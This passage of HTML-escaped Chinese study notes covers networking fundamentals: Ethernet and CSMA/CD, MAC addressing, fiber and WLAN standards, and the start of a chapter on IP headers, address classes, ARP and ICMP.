&lt;li&gt;以太网技术基础&lt;/li&gt;
&lt;li&gt;现代以太网技术&lt;/li&gt;
&lt;li&gt;WLAN技术基础&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;局域网与osi参考模型&#34;&gt;局域网与OSI参考模型&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;LLC子层实现的是一些与硬件无关的功能，例如流量控制、差错控制、差错恢复&lt;/li&gt;
&lt;li&gt;MAC子层提供LLC子层和物理层之间的接口，不同的局域网的介质不同，MAC子层就不同，但是LLC子层是相同的&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200419154117.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;用SAP来标识上层的服务协议&lt;/p&gt;
&lt;h3 id=&#34;主要局域网技术&#34;&gt;主要局域网技术&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;以太网：802.3
&lt;ul&gt;
&lt;li&gt;多台主机连接到一个相同的总线上，在这个时候永远是共享的介质，在数据的传输过程中为了避免在总线上的数据冲突，因此任意时刻只能有一台主机发送数据。共享通讯介质的多台主机之间必须使用冲突避让机制？&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;令牌环网：802.5
&lt;ul&gt;
&lt;li&gt;早期是IBM开发的，被IEEE接受了，形成了802.5标准&lt;/li&gt;
&lt;li&gt;令牌环网是一种特殊的MAC数字帧，来标识你是空闲的还是繁忙的&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;FDDI：802.4
&lt;ul&gt;
&lt;li&gt;光线分布式数字接口&lt;/li&gt;
&lt;li&gt;传输速率在早期的时候可以连接1000个数据节点，传输的距离最远可以达到100KM&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200419161207.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;早期以太网技术介绍&#34;&gt;早期以太网技术介绍&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200419162058.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;10base-t线缆和接口&#34;&gt;10BASE-T线缆和接口&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;10BASE-T使用5类UTP和RJ-45接口&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200419162450.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;双绞线的线距标准
&lt;ul&gt;
&lt;li&gt;EIA/TIA：
&lt;ul&gt;
&lt;li&gt;568A&lt;/li&gt;
&lt;li&gt;568B&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;早期的网络设备的接口-mdimdix&#34;&gt;早期的网络设备的接口 MDI/MDIX&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;同类接口互联用交叉线，异类接口互联用直连线&lt;/li&gt;
&lt;li&gt;H3C以太网交换机支持MDI/MDIX自适应，不必考虑连线类型&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200419162759.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;以太网集线器&#34;&gt;以太网集线器&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;集线器（Hub）与主机构成物理星型拓扑&lt;/li&gt;
&lt;li&gt;集线器内部采用总线结构，任意时间只有一台主机能占用总线&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;这个总线的内部叫冲突域&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200419164202.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h5 id=&#34;csmacd-载波侦听&#34;&gt;CSMA/CD 载波侦听&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;用来保证只有一台主机占用总线&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200419164335.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h5 id=&#34;csmacd-冲突检测和退避&#34;&gt;CSMA/CD 冲突检测和退避&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;当两台主机同时发出数据，会产生冲突&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200419164550.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;mac地址链路层的地址&#34;&gt;MAC地址（链路层的地址）&lt;/h3&gt;
&lt;p&gt;介质访问控制地址&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;MAC地址为48位二进制数，常用12位16进制数表示
&lt;ul&gt;
&lt;li&gt;OUI：组织唯一标识符&lt;/li&gt;
&lt;li&gt;EUI：拓展唯一标识符&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200419164740.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;单播与广播&#34;&gt;单播与广播&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;数据包发送形式：
&lt;ul&gt;
&lt;li&gt;单播：目的地址是唯一的&lt;/li&gt;
&lt;li&gt;广播：所有人都能接收到&lt;/li&gt;
&lt;li&gt;组播：发送者唯一，接收者可以是多个&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;接收地址包括本卡MAC地址、广播地址和本机所属组播组地址&lt;/li&gt;
&lt;li&gt;网卡丢弃与本卡接收地址不匹配的帧&lt;/li&gt;
&lt;li&gt;网卡解开与本卡接收地址匹配的帧，将数据递交上层处理&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200419165101.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;以太网流量控制&#34;&gt;以太网流量控制&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;在半双工线路上采用背压式流控&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;接收方反向发送电压信号制造冲突，使发送方停止发送&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;在全双工线路上采用802.3 PAUSE流控&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;接收方向保留组播地址01-80-C2-00-00-01发送PAUSE帧，通知发送方停止发送&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200419165529.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;0180.C200.0001 组播的MAC地址的一个数字帧&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;总线型以太网拓扑扩展&#34;&gt;总线型以太网拓扑扩展&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;用中继器可以托坎10BASE5和10BASE2网络范围&lt;/li&gt;
&lt;li&gt;所有线缆段都属于一个冲突域&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200419190303.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;543原则：在一个同轴电缆当中，最多只能连接5段，连接4个同轴电缆，只有3个能连接相应的主机&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;星型以太网拓扑扩展&#34;&gt;星型以太网拓扑扩展&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;用集线器可以扩展10BASE-T网络范围&lt;/li&gt;
&lt;li&gt;全部线缆段都属于一个冲突域&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200419190525.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;快速以太网和千兆以太网&#34;&gt;快速以太网和千兆以太网&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;STP：屏蔽的双绞线&lt;/li&gt;
&lt;li&gt;UTP：非屏蔽的双绞线&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200419191100.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;单模光纤与多模光纤&#34;&gt;单模光纤与多模光纤&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;多模光纤
&lt;ul&gt;
&lt;li&gt;较粗的纤芯，传输多种不同波长不同角度的光&lt;/li&gt;
&lt;li&gt;衰耗大，传输距离通常在千米以内&lt;/li&gt;
&lt;li&gt;成本低&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;单模光纤
&lt;ul&gt;
&lt;li&gt;纤芯与广播长相同，传送单一波长的激光&lt;/li&gt;
&lt;li&gt;衰耗小，传输距离可达数十千米&lt;/li&gt;
&lt;li&gt;成本高&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;常用光纤连接器&#34;&gt;常用光纤连接器&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;ST：卡接式圆形光纤接头&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200419191416.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;FC：带螺纹的圆形光纤接头&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200419191438.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;SC：矩形光纤接头&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200419191524.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;LC：一种Mini型连接器&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200419191559.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;用交换机扩展以太网拓扑&#34;&gt;用交换机扩展以太网拓扑&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;隔离冲突域，避免冲突域过大&lt;/li&gt;
&lt;li&gt;进一步扩大物理连接范围&lt;/li&gt;
&lt;li&gt;提高以太网带宽利用率，增加吞吐量&lt;/li&gt;
&lt;li&gt;适应不同的速率和不同的双工情况&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200419191715.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;交换机最早叫做网桥，和Hub的区别是，Hub的每个端口和总线都是相连的，所有的Hub共享一根总线，而交换机的每个端口都对应一根总线。&lt;/p&gt;
&lt;p&gt;Hub：所有的端口是一个冲突域&lt;/p&gt;
&lt;p&gt;交换机：每一个端口都是一个冲突域&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;wlan简介&#34;&gt;WLAN简介&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;WLAN（Wireless LAN）是计算机网络与无线通信技术相结合的产物&lt;/li&gt;
&lt;li&gt;用射频（RF）技术取代旧式的双绞线构成局域网络，提供传统有限局域网的所有功能&lt;/li&gt;
&lt;li&gt;具有部署简单、移动方便、使用便捷等优点。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;80211-协议的发展&#34;&gt;802.11 协议的发展&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200419192208.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;各国授权使用的频段&#34;&gt;各国授权使用的频段&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200419192334.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;80211bg-工作频段划分图&#34;&gt;802.11b/g 工作频段划分图&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200419192414.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;无线覆盖原则-蜂窝式覆盖&#34;&gt;无线覆盖原则-蜂窝式覆盖&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;任意相邻取余使用无频率交叉的频道，如1、6、11频道&lt;/li&gt;
&lt;li&gt;适当调整发射功率，避免跨区域同频干扰&lt;/li&gt;
&lt;li&gt;蜂窝式无线覆盖实现无交叉频率重复使用&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;80211无线网络的介质访问控制&#34;&gt;802.11无线网络的介质访问控制&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200419192818.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;无线网络典型部署-热点覆盖&#34;&gt;无线网络典型部署-热点覆盖&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200419193145.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;无线网络典型部署-办公地点无线互联&#34;&gt;无线网络典型部署-办公地点无线互联&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200419193221.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;本节总结&#34;&gt;本节总结&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;局域网技术类型众多，其中以太网应用最广泛&lt;/li&gt;
&lt;li&gt;局域网划分为LLC子层和MAC子层&lt;/li&gt;
&lt;li&gt;CSMA/CD定义了多路访问介质中的信道抢占、冲突检测和退避算法等&lt;/li&gt;
&lt;li&gt;快速以太网和千兆以太网大大提高了以太网速度&lt;/li&gt;
&lt;li&gt;802.11规定的WLAN技术允许更便捷地部署局域网&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;习题总结-2&#34;&gt;习题总结&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;局域网协议主要有：&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;以太网&lt;/li&gt;
&lt;li&gt;令牌环网&lt;/li&gt;
&lt;li&gt;FDDI网络&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;数据链路层分为：&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;LLC子层：封装和标识上层数据&lt;/li&gt;
&lt;li&gt;MAC子层：适应种类多样的传输介质&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;以太网双绞线线序&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;直连线&lt;/li&gt;
&lt;li&gt;交叉线&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;冲突域：&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;所有端口共享一根总线，其中一个端口无论发送什么样的数据帧，其他端口均能收到&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;单播、组播、广播&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;CSMA/CD&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;载波侦听&lt;/li&gt;
&lt;li&gt;冲突检测和退避&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;数据链路层流量控制&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;背压式流控&lt;/li&gt;
&lt;li&gt;反向PAUSE帧&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;MAC地址&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;48位2进制数，用12位16进制标识&lt;/li&gt;
&lt;li&gt;前24位OUI地址：IEEE分配&lt;/li&gt;
&lt;li&gt;后24位EUI地址：由厂商自行分配&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;总线型以太网扩展：543原则&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;快速以太网和千兆以太网&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;快速以太网协议标准：802.3u&lt;/li&gt;
&lt;li&gt;千兆以太网协议标准：802.3z、802.3ad&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;单模光纤和多模光纤&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;WLAN&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;CSMA/CA（载波侦听多点接入/避让机制）&lt;/li&gt;
&lt;li&gt;802.11a（5GHz）和 802.11b（2.4GHz），802.11g（2.4GHz）不兼容&lt;/li&gt;
&lt;li&gt;蜂窝式覆盖原则&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;==&lt;strong&gt;CSMA/CD和CSMA/CA的区别&lt;/strong&gt;==
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://zhuanlan.zhihu.com/p/74386685&#34;&gt;https://zhuanlan.zhihu.com/p/74386685&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;4-ip基本原理&#34;&gt;4. IP基本原理&lt;/h2&gt;
&lt;h3 id=&#34;引入-2&#34;&gt;引入&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;IP是网络层协议，也是当今应用最广泛的网络协议之一&lt;/li&gt;
&lt;li&gt;IP协议规定了数据的封装方式，网络节点的标识方法，用于网络上数据的端到端的传递&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;课程目标-3&#34;&gt;课程目标&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;掌握IP地址的格式、分类和子网掩码&lt;/li&gt;
&lt;li&gt;掌握路由的基本概念和相关路由协议简介&lt;/li&gt;
&lt;li&gt;掌握网络层协议ARP和RARP的工作原理&lt;/li&gt;
&lt;li&gt;掌握IP寻址的基本原理&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;课程目录&#34;&gt;课程目录&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;IP协议概述&lt;/li&gt;
&lt;li&gt;IP地址和地址映射&lt;/li&gt;
&lt;li&gt;IP包转发&lt;/li&gt;
&lt;li&gt;其他相关协议介绍&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;ip协议概述&#34;&gt;IP协议概述&lt;/h3&gt;
&lt;h4 id=&#34;ip及其相关协议&#34;&gt;IP及其相关协议&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;ICMP（Internet Control Message Protocol）：Internet控制报文协议，ping是基于ICMP的&lt;/li&gt;
&lt;li&gt;IGMP：因特网组播管理协议，管理组播的&lt;/li&gt;
&lt;li&gt;ARP：地址解析协议，把IP地址解析成真正在物理层通信的MAC地址&lt;/li&gt;
&lt;li&gt;RARP：反向地址解析协议，把已知的MAC地址解析成IP地址&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200419211608.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;ip的主要作用&#34;&gt;IP的主要作用&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;标识节点和链路
&lt;ul&gt;
&lt;li&gt;用唯一的IP地址标识每一个节点&lt;/li&gt;
&lt;li&gt;用唯一的IP网络号标识每一个链路&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;寻址和转发
&lt;ul&gt;
&lt;li&gt;确定节点所在网络的位置，进而确定节点所在的位置&lt;/li&gt;
&lt;li&gt;IP路由器选择适当的路径将IP包转发到目的节点&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;适应各种数据链路
&lt;ul&gt;
&lt;li&gt;根据链路的MTU对IP包进行分片和重组&lt;/li&gt;
&lt;li&gt;为了通过实际的数据链路传递信息，须建立IP地址到数据链路层地址的映射&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;ip网络的结构&#34;&gt;IP网络的结构&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;IP网络由多个网段构成，每个网段对应一个链路&lt;/li&gt;
&lt;li&gt;路由器负责将网段连接起来，适配链路层协议，在网络之间转发数据包&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200425210150.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;ip头格式&#34;&gt;IP头格式&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200425210445.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Version：IPv4/IPv6&lt;/li&gt;
&lt;li&gt;IHL：头长度，IP包头的长度&lt;/li&gt;
&lt;li&gt;Type Of Service：服务类型，IP包需要获得的服务等级&lt;/li&gt;
&lt;li&gt;Total Length：IP包的总长度&lt;/li&gt;
&lt;li&gt;Identification：标识符，用来唯一的标识每个IP包，每发送一个+1&lt;/li&gt;
&lt;li&gt;Flags：标识&lt;/li&gt;
&lt;li&gt;Fragment Offset：偏移量，当我们在发送数据报文的时候，大于MTU，将数据报文分片，通过Flags和Fragment Offset来确定。&lt;/li&gt;
&lt;li&gt;Time ti Live：经过路由器的速度，或者经过一个三层设备的速度，-1&lt;/li&gt;
&lt;li&gt;Protocol：协议号&lt;/li&gt;
&lt;li&gt;Header Checksum：头部校验和&lt;/li&gt;
&lt;li&gt;Source Address：源地址，从哪个主机发送过来的&lt;/li&gt;
&lt;li&gt;Destination Address：目的地址&lt;/li&gt;
&lt;li&gt;Options：&lt;/li&gt;
&lt;li&gt;Padding&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;ip地址和地址映射&#34;&gt;IP地址和地址映射&lt;/h3&gt;
&lt;h4 id=&#34;ip地址格式和表示方法&#34;&gt;IP地址格式和表示方法&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200425210951.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;网络号和主机号&#34;&gt;网络号和主机号&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;网络号用于区分不同的IP网络&lt;/li&gt;
&lt;li&gt;主机号用于标识该网络内的一个IP节点&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200425211019.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;ip地址分类&#34;&gt;IP地址分类&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200425211134.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;特殊的ip地址&#34;&gt;特殊的IP地址&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;192.102.1.0&lt;/li&gt;
&lt;li&gt;192.168.1.255&lt;/li&gt;
&lt;li&gt;127.0.0.1&lt;/li&gt;
&lt;li&gt;0.0.0.0&lt;/li&gt;
&lt;li&gt;255.255.255.255 MAC里面全是F&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200425211438.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;arp&#34;&gt;ARP&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;静态：手工配置&lt;/li&gt;
&lt;li&gt;动态：动态学习&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200425211729.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;arp分组格式&#34;&gt;ARP分组格式&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200425212022.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;代理arp&#34;&gt;代理ARP&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;网关起到代理ARP的作用&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200425212130.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;rarp&#34;&gt;RARP&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200425213205.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;icmp&#34;&gt;ICMP&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;ICMP定义了错误报告和其他关于IP数据包处理情况的消息&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ICMP可用于报告IP数据包传递过程中发生的错误、失败等信息，提供网络诊断等功能&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ICMP消息可分为ICMP差错消息和ICMP查询消息&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200425213330.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;icmp报文&#34;&gt;ICMP报文&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200425213549.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;目的不可达&#34;&gt;目的不可达&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200425213658.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;icmp报文格式&#34;&gt;ICMP报文格式&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;IP分组首部包含了源站的IP地址等信息，前8B包含了端口号（TCP或UDP）和序号等的信息，源站需要根据这些信息将差错情况通知上层协议&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200425213724.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;回送请求和应答&#34;&gt;回送请求和应答&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200425213915.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;ip包转发&#34;&gt;IP包转发&lt;/h3&gt;
&lt;h4 id=&#34;主机单播ip包发送&#34;&gt;主机单播IP包发送&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;若目的地址所处网络号与本机所处网络号相同，则目的处于直连网段&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200425214032.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;路由器单播ip包转发&#34;&gt;路由器单播IP包转发&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;若目的地址所处网络号与本机任一接口的网络号相同，则目的处于相应接口直连网段
&lt;ul&gt;
&lt;li&gt;ARP请求&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;路由器通过查找路由信息判断下一跳路由器地址
&lt;ul&gt;
